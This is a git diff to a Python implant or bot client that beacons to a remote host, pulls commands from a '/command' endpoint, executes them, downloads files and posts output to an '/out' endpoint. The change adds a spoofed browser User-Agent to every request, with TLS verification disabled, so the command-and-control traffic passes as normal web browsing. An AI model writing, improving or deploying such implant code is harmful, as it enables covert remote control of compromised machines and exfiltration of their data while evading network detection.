@@ -8,6 +8,16 @@ from optparse import OptionParser
 
 botID = []
 
+# Select your headers
+# User-Agents to use
+#'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
+#'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
+#'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
+headers = {
+  'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
+}
+
+
 def genID(string_length=8):
   random = str(uuid.uuid4())
   random = random.upper()
@@ -26,22 +36,22 @@ def beacon(host, seconds, proxies):
 def send(host, content, output, proxies):
   output = botID[0]+', '+content+', '+output
   if proxies is not None:
-    response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies)
+    response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies, headers = headers)
     return response     
   else:
-    response = requests.post('https://'+host+'/out', data=output, verify=False)
+    response = requests.post('https://'+host+'/out', data=output, verify=False, headers = headers)
     return response 
 
 def request(host, proxies):
   if proxies is not None:
-    response = requests.get('https://'+host+'/command', verify=False, proxies=proxies)
+    response = requests.get('https://'+host+'/command', verify=False, proxies=proxies, headers = headers)
     return response, response.text
   else:
-    response = requests.get('https://'+host+'/command', verify=False)
+    response = requests.get('https://'+host+'/command', verify=False, headers = headers)
     return response, response.text
 
 def request_certs(host, pcert, key):
-  response = requests.get('https://'+host, verify=False, cert=(pcert, key))
+  response = requests.get('https://'+host, verify=False, cert=(pcert, key), headers = headers)
   return response
 
 def parse(response, proxies):
@@ -64,9 +74,9 @@ def execute(command):
 def download(url, proxies):
   local_filename = url.split('/')[-1]
   if proxies is not None:
-    r = requests.get(url, stream=True, verify=False, proxies=proxies)
+    r = requests.get(url, stream=True, verify=False, proxies=proxies, headers = headers)
   else:
-    r = requests.get(url, stream=True, verify=False)
+    r = requests.get(url, stream=True, verify=False, headers = headers)
   with open(local_filename, 'wb') as f:
     for chunk in r.iter_content(chunk_size=1024): 
       if chunk:
